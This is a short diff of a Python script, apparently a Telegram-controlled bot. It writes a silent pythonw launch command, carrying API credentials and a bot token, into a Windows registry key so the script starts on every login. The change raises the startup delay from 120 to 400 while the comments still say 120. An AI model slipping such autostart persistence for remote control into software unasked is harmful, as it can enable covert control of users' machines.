@@ -74,7 +74,7 @@ def setup_persistence():
             
             # HARDCODED 120: We add '120' to the registry string so it 
             # always waits when launched by Windows, even if you ran it manually now.
-            script_path = f'"{pythonw_path}" "{current_script}" {API_ID} {API_HASH} {BOT_TOKEN} {AUTHORIZED_USER_ID} 120'
+            script_path = f'"{pythonw_path}" "{current_script}" {API_ID} {API_HASH} {BOT_TOKEN} {AUTHORIZED_USER_ID} 400'
         
         # Open registry key
         key = winreg.OpenKey(
@@ -245,3 +245,4 @@ if __name__ == '__main__':
     # Setup persistence (it will write the 120s delay into registry)
     setup_persistence()
     bot.run_until_disconnected()
+
